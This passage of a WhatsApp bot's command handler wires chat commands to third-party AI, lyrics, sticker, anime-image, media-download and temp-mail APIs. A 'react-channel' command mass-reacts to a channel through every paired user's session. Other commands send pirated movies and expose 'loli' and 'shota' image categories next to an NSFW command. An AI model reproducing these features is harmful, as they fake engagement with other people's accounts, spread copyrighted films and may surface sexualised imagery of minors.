            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
            if (quoted.conversation) query = quoted.conversation;
            else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
        }

        if (!query) return reply("🤖 *Usage:* gpt5 your question");

        const res = await fetch(`https://apis.prexzyvilla.site/ai/gpt5?text=${encodeURIComponent(query)}`);
        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

        const json = await res.json();
        const answer = json?.result || "";

        if (!answer) return reply("⚠️ *No response from GPT-5*");

        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
        
        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0 ? "🤖 *GPT-5*\n\n" : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error(err);
        reply("⚠️ *GPT-5 unavailable*");
    }
}
break;

case "lyrics": {
    const chatId = m.key.remoteJid;
    const query = args.join(" ");
    
    if (!query) return reply("🎵 *Usage:* lyrics song title");

    try {
        const res = await fetch(`https://apis.prexzyvilla.site/search/lyrics?title=${encodeURIComponent(query)}`);
        const json = await res.json();

        if (!json.status || !json.data || !json.data.lyrics) {
            return reply(`❌ *Lyrics not found for "${query}"*`);
        }

        const { title, artist, album, lyrics } = json.data;
        const chunks = lyrics.match(/[\s\S]{1,3500}/g) || [lyrics];

        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0 ? `🎵 *${title}* – *${artist}*\n📀 ${album || 'Unknown'}\n\n` : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error(err);
        reply("⚠️ *Lyrics fetch failed*");
    }
}
break;

case 'stickerthf':
case 'steal':
case 'stickerwm':
case 'take':
case 'wm': {
    // Check if quoting a message
    if (!m.quoted) {
        return reply(`🎨 *CYBER Sticker Stealer*\n\nReply to a sticker with:\n${prefix}${command} PackName | Author\n\nExample: ${prefix}steal My Pack | My Name`);
    }
    
    // Check if it's a sticker
    if (!m.quoted.mimetype || !m.quoted.mimetype.includes('webp')) {
        return reply(`❌ *CYBER Sticker Stealer*\n\nThat's not a sticker. Reply to a sticker image.`);
    }
    
    try {
        // Show loading reaction
        await devtrust.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });
        
        // Parse packname and author
        let packname = 'CYBER';
        let author = 'GAME CHANGER';
        
        if (text && text.includes('|')) {
            let parts = text.split('|');
            packname = parts[0]?.trim() || 'CYBER';
            author = parts[1]?.trim() || 'GAME CHANGER';
        } else if (text) {
            packname = text;
        }
        
        // Download the sticker
        let media = await m.quoted.download();
        
        // Create sticker with exif
        const { Sticker, StickerTypes } = require('wa-sticker-formatter');
        
        let sticker = new Sticker(media, {
            pack: packname,
            author: author,
            type: StickerTypes.FULL,
            quality: 90,
            background: '#FFFFFF00'
        });
        
        // Convert to buffer
        let stickerBuffer = await sticker.toBuffer();
        
        // Send the sticker
        await devtrust.sendMessage(m.chat, { 
            sticker: stickerBuffer 
        }, { quoted: m });
        
        // Success reaction
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Sticker error:', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Sticker Stealer*\n\nSticker machine is jammed. Try again later.`);
    }
}
break;

case 'react-channel': {
    if (!isCreator) {
        return reply(`🔒 *CYBER React*\n\nThis command is owner only.`);
    }

    const args = text.split(" ");
    if (args.length < 2) {
        return reply(`📌 *CYBER React*\n\nUsage: ${prefix}react-channel [emoji] [channel_link]\nExample: ${prefix}react-channel 👍 https://whatsapp.com/channel/123456/789`);
    }

    const emoji = args[0];
    const link = args[1];
    
    // Better regex for channel links
    const regex = /whatsapp\.com\/channel\/([0-9]+)(?:\/([0-9]+))?/;
    const match = link.match(regex);

    if (!match) {
        return reply(`❌ *CYBER React*\n\nInvalid channel link. Please check the URL.`);
    }

    const channelId = match[1];
    const messageId = match[2];
    
    if (!messageId) {
        return reply(`❌ *CYBER React*\n\nMessage ID not found in the link.`);
    }
    
    const channelJid = `${channelId}@newsletter`;

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
        
        reply(`🔄 *CYBER React*\n\nSpreading ${emoji} to ${channelId}...`);

        const pairedUsers = await loadUsers();
        
        if (!pairedUsers || pairedUsers.length === 0) {
            return reply(`⚠️ *CYBER React*\n\nNo paired users found in the database.`);
        }

let success = 0;
let failed = 0;
let errors = [];

for (const user of pairedUsers) {
    try {
        const session = getSession(user.id || user.jid || user.number + '@s.whatsapp.net');
        
        // Try to send reaction
        let sent = false;
        
        if (session) {
            try {
                await session.sendMessage(channelJid, {
                    react: {
                        text: emoji,
                        key: { 
                            id: messageId, 
                            remoteJid: channelJid 
                        }
                    }
                });
                sent = true;
                success++;
                console.log(`✅ React success for ${user.id || user.number}`);
            } catch (sessionError) {
                console.log(`Session send failed for ${user.id}, trying main bot...`);
            }
        }
        
        // If session failed, try main bot as fallback
        if (!sent) {
            try {
                await devtrust.sendMessage(channelJid, {
                    react: {
                        text: emoji,
                        key: { 
                            id: messageId, 
                            remoteJid: channelJid 
                        }
                    }
                });
                success++;
                console.log(`✅ React success via main bot for ${user.id || user.number}`);
                sent = true;
            } catch (mainError) {
                throw new Error('Both session and main bot failed');
            }
        }
        
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 1000));
        
    } catch (e) {
        failed++;
        errors.push(`User ${user.id || user.number}: ${e.message}`);
        console.error(`React error for user ${user.id || user.number}:`, e.message);
    }
}

        const resultMessage = `✅ *CYBER React Complete*\n\n` +
            `Emoji: ${emoji}\n` +
            `Channel: ${channelId}\n` +
            `Success: ${success}\n` +
            `Failed: ${failed}`;
        
        reply(resultMessage);
        
        // Log errors if any (for debugging)
        if (errors.length > 0 && failed > 0) {
            console.log('React errors:', errors.slice(0, 3));
        }
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Mass react error:', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER React*\n\nReaction service is overloaded. Try again later.`);
    }
}
break;

case "nsfw": {
    // Adult unlock check
    const _nsfwSenderNum = (m.sender || '').split('@')[0].split(':')[0];
    const _nsfwUnlocked = (() => { try { const u = fs.existsSync('./database/adult_unlocked.json') ? JSON.parse(fs.readFileSync('./database/adult_unlocked.json','utf-8')) : []; return u.some(id => String(id).replace(/[^0-9]/g,'') === _nsfwSenderNum); } catch(e) { return false; } })();
    const _nsfwBanned = (() => { try { const b = fs.existsSync('./database/adult_banned.json') ? JSON.parse(fs.readFileSync('./database/adult_banned.json','utf-8')) : []; return b.some(id => String(id).replace(/[^0-9]/g,'') === _nsfwSenderNum); } catch(e) { return false; } })();
    if (_nsfwBanned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
    if (!_nsfwUnlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
    try {
        const res = await axios.get("https://apis.prexzyvilla.site/random/anhnsfw");
        const img = res.data?.message;
        if (!img) return reply("❌ *Content unavailable*");
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: img },
                caption: "🔞 *NSFW Content*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("❌ *Failed to fetch content*");
    }
}
break;

// Bulk anime image commands - all follow same pattern
case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa':
case 'boruto': case 'bts': case 'cecan': case 'chiho': case 'chitoge':
case 'cogan': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri':
case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia':
case 'erza': case 'exo': case 'femdom': case 'freefire': case 'gamewallpaper':
case 'glasses': case 'gremory': case 'hacker': case 'hestia': case 'husbu':
case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori':
case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura':
case 'kakashi': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki':
case 'kotori': case 'kpop': case 'kucing': case 'kurumi': case 'lisa':
case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey':
case 'miku': case 'minato': case 'mobile': case 'motor': case 'mountain':
case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko':
case 'onepiece': case 'pentol': case 'pokemon': case 'profil': case 'programming':
case 'pubg': case 'randblackpink': case 'randomnime': case 'randomnime2':
case 'rize': case 'rose': case 'ryujin': case 'sagiri': case 'sakura':
case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya':
case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': {
    const baseUrl = 'https://apis.prexzyvilla.site/random/anime/';
    const endpoint = command; // command name matches API endpoint
    
    try {
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: baseUrl + endpoint },
                caption: `🎌 *${command.charAt(0).toUpperCase() + command.slice(1)}*`
            }),
            { quoted: m }
        );
    } catch (err) {
        reply(`❌ *Failed to fetch ${command} image*`);
    }
}
break;

case 'toukachan': {
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/anime/toukachan' },
            caption: "🎌 *Touka-chan*"
        }),
        { quoted: m }
    );
}
break;

case 'tsunade': {
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/anime/tsunade' },
            caption: "🎌 *Tsunade*"
        }),
        { quoted: m }
    );
}
break;

case 'wfbbbu': {
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/anime/waifu' },
            caption: "✨ *Random Waifu*"
        }),
        { quoted: m }
    );
}
break;

case 'wallhp': {
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/anime/wallhp' },
            caption: "🖼️ *Wallpaper*"
        }),
        { quoted: m }
    );
}
break;

case 'wallml': {
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/anime/wallml' },
            caption: "🖼️ *Anime Wallpaper*"
        }),
        { quoted: m }
    );
}
break;

case 'wallmlnime': {
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/anime/wallmlnime' },
            caption: "🖼️ *Anime Wallpaper*"
        }),
        { quoted: m }
    );
}
break;

case 'yotsuba': {
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/anime/yotsuba' },
            caption: "🎌 *Yotsuba*"
        }),
        { quoted: m }
    );
}
break;

case 'yuki': {
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/anime/yuki' },
            caption: "🎌 *Yuki*"
        }),
        { quoted: m }
    );
}
break;

case 'yulibocil': {
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/anime/yulibocil' },
            caption: "🎌 *Yuli Bocil*"
        }),
        { quoted: m }
    );
}
break;

case 'yumeko': {
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/anime/yumeko' },
            caption: "🎌 *Yumeko*"
        }),
        { quoted: m }
    );
}
break;

case "gemivbnni": {
    const chatId = m.key.remoteJid;
    let query = args.join(" ").trim();
    
    try {
        if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
            if (quoted.conversation) query = quoted.conversation;
            else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
        }

        if (!query) {
            return reply("🤖 *Usage:* gemini your question");
        }

        const res = await fetch(`https://apis.prexzyvilla.site/ai/gemini?text=${encodeURIComponent(query)}`);
        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

        const json = await res.json();
        const answer = json?.data || "";

        if (!answer) return reply("⚠️ *No response from Gemini*");

        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
        
        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0 ? "🤖 *Gemini*\n\n" : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error(err);
        reply("⚠️ *Gemini unavailable*");
    }
}
break;

// ============ MOVIE COMMANDS ============
case 'movie2': {
    if (!text) return reply(`🎬 *Usage:* ${prefix + command} movie name`);

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
        await reply(`🔍 *Searching for "${text}"...*`);
        
        const apiUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/search?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
        const { status, result } = response.data;

        if (!status || !result || result.movies.length === 0) {
            return reply(`❌ *No movies found for "${text}"*`);
        }

        // Store results for THIS USER only
        userMovieSessions[m.sender] = {
            movies: result.movies,
            timestamp: Date.now()
        };

        let movieList = `🎥 *Results for "${text}"*\n\n`;
        result.movies.slice(0, 5).forEach((movie, index) => {
            movieList += `${index + 1}. *${movie.title}*\n`;
            movieList += `   ⭐ ${movie.imdb || 'N/A'} | 📅 ${movie.year || 'N/A'}\n\n`;
        });
        
        if (result.movies.length > 5) {
            movieList += `_...and ${result.movies.length - 5} more_\n\n`;
        }
        
        movieList += `📌 *Select:* .selectmovie [number]`;

        await reply(movieList);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Movie search error:', error);
        reply(`❌ *Search failed* • Try again later`);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
}
break;

case 'selectmovie': {
    if (!text) return reply(`🎬 *Usage:* selectmovie [number]`);
    
    const userSession = userMovieSessions[m.sender];
    if (!userSession || !userSession.movies || userSession.movies.length === 0) {
        return reply(`❌ *No movies found. Use .movie command first*`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= userSession.movies.length) {
        return reply(`❌ *Invalid number* • Choose 1-${userSession.movies.length}`);
    }

    const selectedMovie = userSession.movies[selectedIndex];
    const movieDetailsUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/movie?url=${encodeURIComponent(selectedMovie.link)}`;

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
        await reply(`🔍 *Fetching details for "${selectedMovie.title}"...*`);
        
        const response = await axios.get(movieDetailsUrl);
        const { status, result } = response.data;

        if (!status || !result) return reply(`❌ *Failed to fetch details*`);

        const movie = result.data;
        
        // Store download links for THIS USER
        userSession.selectedMovie = {
            title: movie.title,
            links: movie.dl_links || []
        };

        let movieInfo = `🎬 *${movie.title}*\n\n` +
            `📅 ${movie.date || 'N/A'}\n` +
            `🌍 ${movie.country || 'N/A'}\n` +
            `⏳ ${movie.runtime || 'N/A'}\n` +
            `⭐ ${movie.imdbRate || 'N/A'}/10\n\n` +
            `📥 *Available Qualities*\n`;

        if (movie.dl_links && movie.dl_links.length > 0) {
            movie.dl_links.forEach((link, index) => {
                movieInfo += `${index + 1}. ${link.quality || 'Unknown'} - ${link.size || 'N/A'}\n`;
            });
            movieInfo += `\n📌 *Download:* .dlmovie [number]`;
        } else {
            movieInfo += `No download links available`;
        }

        // Send poster if available
        if (movie.image) {
            await devtrust.sendMessage(m.chat,
                addNewsletterContext({
                    image: { url: movie.image },
                    caption: movieInfo
                }),
                { quoted: m }
            );
        } else {
            await reply(movieInfo);
        }
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Movie details error:', error);
        reply(`❌ *Failed to fetch movie details*`);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
}
break;

case 'dlmovie': {
    if (!text) return reply(`📥 *Usage:* dlmovie [number]`);
    
    const userSession = userMovieSessions[m.sender];
    if (!userSession || !userSession.selectedMovie || !userSession.selectedMovie.links) {
        return reply(`❌ *No movie selected. Use .selectmovie first*`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= userSession.selectedMovie.links.length) {
        return reply(`❌ *Invalid number* • Choose 1-${userSession.selectedMovie.links.length}`);
    }

    const selectedLink = userSession.selectedMovie.links[selectedIndex]?.link;
    if (!selectedLink) return reply(`❌ *Download link not found*`);

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        await reply(`⏳ *Downloading "${userSession.selectedMovie.title}"...*\nQuality: ${selectedLink.quality || 'Unknown'}\nSize: ${selectedLink.size || 'Unknown'}`);

        // Send as document
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                document: { url: selectedLink },
                mimetype: 'video/mp4',
                fileName: `${userSession.selectedMovie.title}.mp4`,
                caption: `🎬 *${userSession.selectedMovie.title}*`
            }),
            { quoted: m }
        );
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Movie download error:', error);
        reply(`❌ *Download failed* • Try again later`);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
}
break;
// =========================================

case 'deepsjfkeek': {
    if (!text) return reply("🤖 *Usage:* deepseek your question");

    try {
        const response = await axios.get(
            `https://apis.prexzyvilla.site/ai/deepseek?text=${encodeURIComponent(text)}`
        );

        if (response.data && response.data.success) {
            reply(`🤖 *DeepSeek*\n\n${response.data.result}`);
        } else {
            reply(`⚠️ *No response*`);
        }
    } catch (error) {
        console.error(error);
        reply(`❌ *DeepSeek error*`);
    }
    break;
}

case "grovnnk-ai": {
    const chatId = m.key.remoteJid;
    let query = args.join(" ").trim();
    
    try {
        if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
            if (quoted.conversation) query = quoted.conversation;
            else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
        }

        if (!query) return reply("🤖 *Usage:* grok your question");

        const res = await fetch(`https://apis.prexzyvilla.site/ai/grok?text=${encodeURIComponent(query)}`);
        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

        const json = await res.json();
        const answer = json?.data || "";

        if (!answer) return reply("⚠️ *No response from Grok*");

        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
        
        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0 ? "🤖 *Grok*\n\n" : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error(err);
        reply("⚠️ *Grok unavailable*");
    }
}
break;

case 'stupidcheck': case 'uncleancheck': case 'hotcheck': case 'smartcheck': 
case 'greatcheck': case 'evilcheck': case 'dogcheck': case 'coolcheck': 
case 'gaycheck': case 'waifucheck': {
    const okebnh1 = Array.from({length: 100}, (_, i) => (i + 1).toString());
    const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)];
    
    const msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: xeonkak + "%"
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'CYBER'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false,
                        ...await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.png') }, { upload: devtrust.waUploadToServer })
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"✅\",\"id\":\"\"}`
                        }],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: NEWSLETTER_JID,
                            newsletterName: NEWSLETTER_NAME,
                            serverMessageId: -1
                        }
                    }
                })
            }
        }
    }, { quoted: m });
    
    return await devtrust.relayMessage(m.chat, msgs.message, {});
}
break;

case "metabcn-ai": {
    const chatId = m.key.remoteJid;
    let query = args.join(" ").trim();
    
    try {
        if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
            if (quoted.conversation) query = quoted.conversation;
            else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
        }

        if (!query) return reply("🤖 *Usage:* meta your question");

        const res = await fetch(`https://apis.prexzyvilla.site/ai/meta-ai?text=${encodeURIComponent(query)}`);
        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

        const json = await res.json();
        const answer = json?.data || "";

        if (!answer) return reply("⚠️ *No response from Meta AI*");

        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
        
        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0 ? "🤖 *Meta AI*\n\n" : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error(err);
        reply("⚠️ *Meta AI unavailable*");
    }
}
break;

case "qwenxj": {
    const chatId = m.key.remoteJid;
    let query = args.join(" ").trim();
    
    try {
        if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
            if (quoted.conversation) query = quoted.conversation;
            else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
        }

        if (!query) return reply("🤖 *Usage:* qwen your question");

        const res = await fetch(`https://apis.prexzyvilla.site/ai/qwen?text=${encodeURIComponent(query)}`);
        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

        const json = await res.json();
        const answer = json?.data || "";

        if (!answer) return reply("⚠️ *No response from Qwen*");

        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
        
        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0 ? "🤖 *Qwen*\n\n" : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error(err);
        reply("⚠️ *Qwen unavailable*");
    }
}
break;

case 'fb':
case 'fbdl':
case 'facebook': {
    const fbInput = m.message?.conversation || m.message?.extendedTextMessage?.text;
    const fbUrl = fbInput?.split(' ')?.slice(1)?.join(' ')?.trim();

    if (!fbUrl) return reply("🔗 *Provide a Facebook video URL*\n\nExample: `.fb https://facebook.com/reel/...`");
    if (!fbUrl.includes('facebook.com')) return reply("❌ *Invalid Facebook link*");

    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const fbRes = await axios.get(`https://api.princetechn.com/api/download/facebook?apikey=prince&url=${encodeURIComponent(fbUrl)}`);
        const fbData = fbRes.data;

        if (!fbData || fbData.status !== 200 || !fbData.result) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply("❌ *Failed to fetch Facebook video*");
        }

        const fbResult = fbData.result;
        const fbVidUrl = fbResult.hd_video || fbResult.sd_video;
        if (!fbVidUrl) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply("❌ *No downloadable video found*");
        }

        const fbCaption = `📹 *Facebook Video*\n${fbResult.title ? `\n📌 ${fbResult.title}` : ''}${fbResult.duration ? `\n⏱️ Duration: ${fbResult.duration}` : ''}`;

        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                video: { url: fbVidUrl },
                mimetype: "video/mp4",
                caption: fbCaption
            }),
            { quoted: m }
        );
    } catch (error) {
        console.error('[FB DL]', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply("❌ *Facebook download failed. Please try again.*");
    }
    break;
}

case 'twitter':
case 'twit':
case 'twitterdl':
case 'xdl': {
    const twUrl = text?.trim();
    if (!twUrl) return reply("🔗 *Provide a Twitter/X video URL*\n\nExample: `.twitter https://twitter.com/user/status/...`");
    if (!twUrl.includes('twitter.com') && !twUrl.includes('x.com')) return reply("❌ *Invalid Twitter/X link*");

    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const twRes = await axios.get(`https://api.princetechn.com/api/download/twitter?apikey=prince&url=${encodeURIComponent(twUrl)}`);
        const twData = twRes.data;

        if (!twData || twData.status !== 200 || !twData.result) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply("❌ *Failed to fetch Twitter/X video*");
        }

        const twResult = twData.result;
        const twVideos = twResult.videoUrls;
        if (!twVideos || twVideos.length === 0) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply("❌ *No downloadable video found in this tweet*");
        }

        const bestVideo = twVideos[0];
        const twCaption = `🐦 *Twitter/X Video*\n\n📊 Quality: ${bestVideo.quality}`;

        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                video: { url: bestVideo.url },
                mimetype: "video/mp4",
                caption: twCaption
            }),
            { quoted: m }
        );
    } catch (error) {
        console.error('[TWITTER DL]', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply("❌ *Twitter download failed. Please try again.*");
    }
    break;
}

case 'igdl':
case 'instagram':
case 'ig': {
    const igUrl = text?.trim();
    if (!igUrl) return reply("🔗 *Provide an Instagram link*\n\nExample: `.ig https://www.instagram.com/reel/...`");
    if (!igUrl.includes('instagram.com')) return reply("❌ *Invalid Instagram link*");

    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const igResult = await igDownload(igUrl);
        const { caption, medias } = igResult;

        if (!medias || medias.length === 0) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply("❌ *No downloadable media found in this post*");
        }

        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        // Send all media (supports single post, reel, and carousel)
        for (let i = 0; i < medias.length; i++) {
            const media = medias[i];
            const isLast = i === medias.length - 1;
            const mediaCaption = isLast && caption
                ? `📸 *Instagram*\n\n${caption.slice(0, 500)}`
                : (medias.length === 1 ? (media.type === 'video' ? "📹 *Instagram Video*" : "📸 *Instagram Image*") : '');

            try {
                if (media.type === 'video') {
                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            video: { url: media.url },
                            mimetype: 'video/mp4',
                            caption: mediaCaption
                        }),
                        { quoted: m }
                    );
                } else {
                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: media.url },
                            caption: mediaCaption
                        }),
                        { quoted: m }
                    );
                }
            } catch (sendErr) {
                console.error('[IG DL] send error for item', i, sendErr.message);
            }

            // Small delay between carousel items to avoid flood
            if (i < medias.length - 1) await new Promise(r => setTimeout(r, 800));
        }
    } catch (err) {
        console.error('[IG DL]', err.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply("❌ *Instagram download failed. Please try again.*");
    }
    break;
}

// ============ TEMP MAIL COMMANDS ============
case "tempmail":
case "tmpmail":
case "newmail": {
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📧', key: m.key } });
        
        // Generate new email
        const response = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1');
        const email = response.data[0];

        if (!email) return reply("❌ *Failed to generate email*");

        // Store email for this user
        tempMailData[m.sender] = { 
            email: email,
            login: email.split('@')[0],
            domain: email.split('@')[1],
            createdAt: Date.now()
        };

        const message = `📧 *Temporary Email Created*\n\n` +
            `📨 ${email}\n\n` +
            `📌 *Commands:*\n` +
            `• checkmail - Check inbox\n` +
            `• readmail [id] - Read specific email\n` +
            `• delmail - Delete current email\n\n` +
            `_Email expires in 24 hours_`;

        reply(message);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Temp mail error:', error);
        reply("❌ *Error creating temporary email*");
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
    break;
}

case "checkmail":
case "checkmails":
case "inbox": {
    const userMail = tempMailData[m.sender];
    if (!userMail || !userMail.email) {
        return reply("❌ *No email found. Use `tempmail` first*");
    }

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📬', key: m.key } });
        
        const response = await axios.get(
            `https://www.1secmail.com/api/v1/?action=getMessages&login=${userMail.login}&domain=${userMail.domain}`
        );
        
        const messages = response.data;
        
        if (!messages || messages.length === 0) {
            return reply(`📭 *Inbox Empty*\n\nYour inbox for ${userMail.email} has no messages.`);
        }

        let inboxText = `📬 *Inbox - ${userMail.email}*\n\n`;
        inboxText += `Found ${messages.length} message(s):\n\n`;

        messages.forEach((msg, index) => {
            inboxText += `${index + 1}. 📧 *From:* ${msg.from}\n`;
            inboxText += `   📅 *Date:* ${msg.date}\n`;
            inboxText += `   📝 *Subject:* ${msg.subject}\n`;
            inboxText += `   🆔 *ID:* ${msg.id}\n\n`;
        });

        inboxText += `_Use "readmail [id]" to read a message_`;
        
        // Store messages for this user
        tempMailData[m.sender].messages = messages;
        
        reply(inboxText);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Check mail error:', error);
        reply("❌ *Error checking inbox*");
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
    break;
}

case "readmail":
case "reademail": {
    const userMail = tempMailData[m.sender];
    if (!userMail || !userMail.email) {
        return reply("❌ *No email found. Use `tempmail` first*");
    }

    const messageId = args[0];
